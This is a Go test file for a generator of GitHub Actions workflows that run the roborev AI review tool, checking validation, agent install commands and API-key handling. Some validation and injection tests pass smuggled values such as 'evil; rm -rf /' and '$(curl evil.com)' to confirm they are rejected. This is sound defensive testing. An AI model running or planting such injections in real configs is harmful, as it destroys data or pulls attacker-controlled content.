package ghaction

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"gopkg.in/yaml.v3"
)

func TestDefaultConfig(t *testing.T) {
	cfg := DefaultConfig()
	require.Len(t, cfg.Agents, 1, "expected 1 agent, got %d", len(cfg.Agents))
	require.Equal(t, "codex", cfg.Agents[0], "expected default agent to be codex")
}

func TestValidate(t *testing.T) {
	tests := []struct {
		name    string
		cfg     WorkflowConfig
		wantErr string
	}{
		{
			name: "valid default",
			cfg:  DefaultConfig(),
		},
		{
			name: "valid multi-agent",
			cfg: WorkflowConfig{
				Agents: []string{"codex", "claude-code"},
			},
		},
		{
			name: "valid kiro agent",
			cfg:  WorkflowConfig{Agents: []string{"kiro"}},
		},
		{
			name: "valid kilo agent",
			cfg:  WorkflowConfig{Agents: []string{"kilo"}},
		},
		{
			name:    "invalid agent",
			cfg:     WorkflowConfig{Agents: []string{"evil; rm -rf /"}},
			wantErr: "invalid agent",
		},
		{
			name:    "empty agents",
			cfg:     WorkflowConfig{Agents: []string{}},
			wantErr: "at least one agent",
		},
		{
			name: "invalid version",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "$(curl evil.com)",
			},
			wantErr: "invalid roborev version",
		},
		{
			name: "valid version",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "0.33.1",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.cfg.Validate()
			if tt.wantErr != "" {
				require.Error(t, err, "expected error")
				require.ErrorContains(t, err, tt.wantErr, "unexpected error")

			} else if err != nil {
				require.Failf(t, "unexpected error", "%v", err)
			}
		})
	}
}

func TestGenerate(t *testing.T) {
	tests := []struct {
		name        string
		cfg         WorkflowConfig
		wantStrs    []string
		notWantStrs []string
		envChecks   func(t *testing.T, env map[string]string)
	}{
		{
			name: "default config",
			cfg:  DefaultConfig(),
			wantStrs: []string{
				"name: roborev",
				"pull_request:",
				"Install roborev",
				"Install agents",
				"Run review",
				"roborev ci review",
				"--ref",
				"--comment",
				"--gh-repo",
				"--pr",
				"OPENAI_API_KEY",
				"actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd",
				"sha256sum --check",
				"grep -F \"  ${ARCHIVE}\" SHA256SUMS > verify.txt",
				"set -euo pipefail",
				"@openai/codex@latest",
				"Pin agent CLI versions",
				`"$HOME/.local/bin"`,
				"$GITHUB_PATH",
				`"$HOME/.local/bin/roborev" version`,
				"api.github.com",
			},
			notWantStrs: []string{
				"--commit",
				"--format json",
				"comment --pr",
				"actions/checkout@v4",
				"--local",
				"--agent codex",
				"Post results",
				"/usr/local/bin",
				"--ignore-missing",
			},
			envChecks: func(t *testing.T, env map[string]string) {
				assert.Contains(t, env, "OPENAI_API_KEY", "expected OPENAI_API_KEY env var")
			},
		},
		{
			name: "multi agent",
			cfg: WorkflowConfig{
				Agents: []string{"codex", "claude-code"},
			},
			wantStrs: []string{
				"@openai/codex@latest",
				"@anthropic-ai/claude-code@latest",
				"OPENAI_API_KEY",
				"ANTHROPIC_API_KEY",
			},
		},
		{
			name: "claude agent",
			cfg: WorkflowConfig{
				Agents: []string{"claude-code"},
			},
			wantStrs: []string{
				"ANTHROPIC_API_KEY",
				"@anthropic-ai/claude-code@latest",
			},
		},
		{
			name: "gemini agent",
			cfg: WorkflowConfig{
				Agents: []string{"gemini"},
			},
			wantStrs: []string{
				"GOOGLE_API_KEY",
				"@google/gemini-cli@latest",
			},
		},
		{
			name: "copilot agent",
			cfg: WorkflowConfig{
				Agents: []string{"copilot"},
			},
			wantStrs: []string{
				"@github/copilot@latest",
				"GH_TOKEN:",
			},
			envChecks: func(t *testing.T, env map[string]string) {
				assert.NotContains(t, env, "GITHUB_TOKEN", "env block should not contain bare GITHUB_TOKEN: entry for copilot")
			},
		},
		{
			name: "pinned version",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "0.33.1",
			},
			wantStrs: []string{
				`ROBOREV_VERSION="0.33.1"`,
			},
			notWantStrs: []string{
				"api.github.com",
			},
		},
		{
			name: "empty fields",
			cfg:  WorkflowConfig{},
			wantStrs: []string{
				"OPENAI_API_KEY",
				"@openai/codex@latest",
			},
		},
		{
			name: "opencode uses ANTHROPIC_API_KEY",
			cfg: WorkflowConfig{
				Agents: []string{"opencode"},
			},
			wantStrs: []string{
				"opencode-ai@latest",
				"ANTHROPIC_API_KEY",
				"different model provider",
			},
			envChecks: func(t *testing.T, env map[string]string) {
				assert.Contains(t, env, "ANTHROPIC_API_KEY", "expected ANTHROPIC_API_KEY in env")
			},
		},
		{
			name: "kilo gets multi-provider comment",
			cfg: WorkflowConfig{
				Agents: []string{"kilo"},
			},
			wantStrs: []string{
				"@kilocode/cli@latest",
				"ANTHROPIC_API_KEY",
				"different model provider",
				"default for kilo",
			},
			envChecks: func(t *testing.T, env map[string]string) {
				assert.Contains(t, env, "ANTHROPIC_API_KEY", "expected ANTHROPIC_API_KEY in env")
			},
		},
		{
			name: "kiro skipped from env entries",
			cfg: WorkflowConfig{
				Agents: []string{"kiro"},
			},
			wantStrs: []string{
				"kiro.dev",
			},
			notWantStrs: []string{
				"OPENAI_API_KEY",
				"ANTHROPIC_API_KEY",
				"AWS_ACCESS_KEY_ID",
			},
		},
		{
			name: "dedupes env vars",
			cfg: WorkflowConfig{
				Agents: []string{"claude-code", "opencode"},
			},
			wantStrs: []string{
				"@anthropic-ai/claude-code@latest",
				"opencode-ai@latest",
			},
			envChecks: func(t *testing.T, env map[string]string) {
				assert.Contains(t, env, "ANTHROPIC_API_KEY", "expected ANTHROPIC_API_KEY in env")
			},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			out, err := Generate(tt.cfg)
			require.NoError(t, err, "Generate failed: %v", err)
			for _, want := range tt.wantStrs {
				assert.Contains(t, out, want)
			}
			for _, notWant := range tt.notWantStrs {
				assert.NotContains(t, out, notWant)
			}

			if tt.envChecks != nil || tt.name == "dedupes env vars" {
				var wf struct {
					Jobs map[string]struct {
						Steps []struct {
							Name string            `yaml:"name"`
							Env  map[string]string `yaml:"env"`
						} `yaml:"steps"`
					} `yaml:"jobs"`
				}
				if err := yaml.Unmarshal([]byte(out), &wf); err != nil {
					require.NoError(t, err, "failed to parse yaml: %v", err)
				}

				var reviewEnv map[string]string
				for _, job := range wf.Jobs {
					for _, step := range job.Steps {
						if step.Name == "Run review" {
							reviewEnv = step.Env
						}
					}
				}
				if tt.envChecks != nil {
					tt.envChecks(t, reviewEnv)
				}

				if tt.name == "dedupes env vars" {
					lines := strings.Split(out, "\n")
					envDefCount := 0
					for _, line := range lines {
						if strings.HasPrefix(strings.TrimSpace(line), "ANTHROPIC_API_KEY:") {
							envDefCount++
						}
					}
					assert.Equal(t, 1, envDefCount)
				}
			}
		})
	}
}

func TestAgentInstallCmd(t *testing.T) {
	tests := []struct {
		agent       string
		wantPkg     string
		notWantPkgs []string
	}{
		{
			agent:   "codex",
			wantPkg: "npm install -g @openai/codex@latest",
		},
		{
			agent:   "claude-code",
			wantPkg: "npm install -g @anthropic-ai/claude-code@latest",
		},
		{
			agent:   "gemini",
			wantPkg: "npm install -g @google/gemini-cli@latest",
			notWantPkgs: []string{
				"@anthropic-ai/gemini",
			},
		},
		{
			agent:   "copilot",
			wantPkg: "npm install -g @github/copilot@latest",
			notWantPkgs: []string{
				"gh extension install",
			},
		},
		{
			agent:   "cursor",
			wantPkg: "not available in CI",
		},
		{
			agent:   "kiro",
			wantPkg: "kiro.dev",
		},
		{
			agent:   "kilo",
			wantPkg: "@kilocode/cli@latest",
		},
		{
			agent:   "droid",
			wantPkg: "droid-cli",
		},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			cmd := AgentInstallCmd(tt.agent)
			assert.Contains(t, cmd, tt.wantPkg)
			for _, bad := range tt.notWantPkgs {
				assert.NotContains(t, cmd, bad)
			}
		})
	}
}

func TestGenerate_Injection_Rejected(t *testing.T) {
	tests := []struct {
		name string
		cfg  WorkflowConfig
	}{
		{
			name: "agent injection",
			cfg: WorkflowConfig{
				Agents: []string{"codex; rm -rf /"},
			},
		},
		{
			name: "version injection",
			cfg: WorkflowConfig{
				Agents:         []string{"codex"},
				RoborevVersion: "1.0.0$(curl evil)",
			},
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := Generate(tt.cfg)
			require.Error(t, err, "expected Generate to reject config")
		})
	}
}

func TestWriteWorkflow_CreatesFile(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(
		dir, ".github", "workflows", "roborev.yml")

	cfg := DefaultConfig()
	err := WriteWorkflow(cfg, outPath, false)
	require.NoError(t, err)

	content, err := os.ReadFile(outPath)
	require.NoError(t, err)
	assert.Contains(t, string(content), "name: roborev", "written file should contain workflow name")
}

func TestWriteWorkflow_ExistingFile_NoForce(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "roborev.yml")

	if err := os.WriteFile(
		outPath, []byte("existing"), 0644); err != nil {
		require.NoError(t, err)
	}

	cfg := DefaultConfig()
	err := WriteWorkflow(cfg, outPath, false)
	require.Error(t, err, "expected error for existing file without --force")
	assert.Contains(t, err.Error(), "already exists")

	content, err := os.ReadFile(outPath)
	require.NoError(t, err)
	assert.Equal(t, "existing", string(content), "existing file content should be preserved")
}

func TestWriteWorkflow_ExistingFile_Force(t *testing.T) {
	dir := t.TempDir()
	outPath := filepath.Join(dir, "roborev.yml")

	if err := os.WriteFile(
		outPath, []byte("existing"), 0644); err != nil {
		require.NoError(t, err)
	}

	cfg := DefaultConfig()
	err := WriteWorkflow(cfg, outPath, true)
	require.NoError(t, err)

	content, err := os.ReadFile(outPath)
	require.NoError(t, err)
	assert.NotEqual(t, "existing", string(content), "force should have overwritten existing content")
	assert.Contains(t, string(content), "name: roborev", "overwritten file should contain workflow name")
}

func TestAgentEnvVar(t *testing.T) {
	tests := []struct {
		agent string
		want  string
	}{
		{"codex", "OPENAI_API_KEY"},
		{"claude-code", "ANTHROPIC_API_KEY"},
		{"gemini", "GOOGLE_API_KEY"},
		{"copilot", "GITHUB_TOKEN"},
		{"opencode", "ANTHROPIC_API_KEY"},
		{"kiro", "GITHUB_TOKEN"},
		{"kilo", "ANTHROPIC_API_KEY"},
		{"droid", "OPENAI_API_KEY"},
	}
	for _, tt := range tests {
		t.Run(tt.agent, func(t *testing.T) {
			got := AgentEnvVar(tt.agent)
			assert.Equal(t, tt.want, got)
		})
	}
}

func TestAgentSecrets(t *testing.T) {
	tests := []struct {
		name     string
		agents   []string
		wantLen  int
		wantVars []string
	}{
		{
			name:     "single agent",
			agents:   []string{"codex"},
			wantLen:  1,
			wantVars: []string{"OPENAI_API_KEY"},
		},
		{
			name:     "codex and opencode have separate keys",
			agents:   []string{"codex", "opencode"},
			wantLen:  2,
			wantVars: []string{"OPENAI_API_KEY", "ANTHROPIC_API_KEY"},
		},
		{
			name:     "dedupes by env var",
			agents:   []string{"claude-code", "opencode"},
			wantLen:  1,
			wantVars: []string{"ANTHROPIC_API_KEY"},
		},
		{
			name:     "multi env var",
			agents:   []string{"codex", "claude-code"},
			wantLen:  2,
			wantVars: []string{"OPENAI_API_KEY", "ANTHROPIC_API_KEY"},
		},
		{
			name:     "copilot alone produces empty list",
			agents:   []string{"copilot"},
			wantLen:  0,
			wantVars: nil,
		},
		{
			name:     "copilot plus codex only codex secret",
			agents:   []string{"copilot", "codex"},
			wantLen:  1,
			wantVars: []string{"OPENAI_API_KEY"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			secrets := AgentSecrets(tt.agents)
			assert.Len(t, secrets, tt.wantLen)
			for i, wantVar := range tt.wantVars {
				assert.Equal(t, wantVar, secrets[i].EnvVar)
			}
		})
	}
}
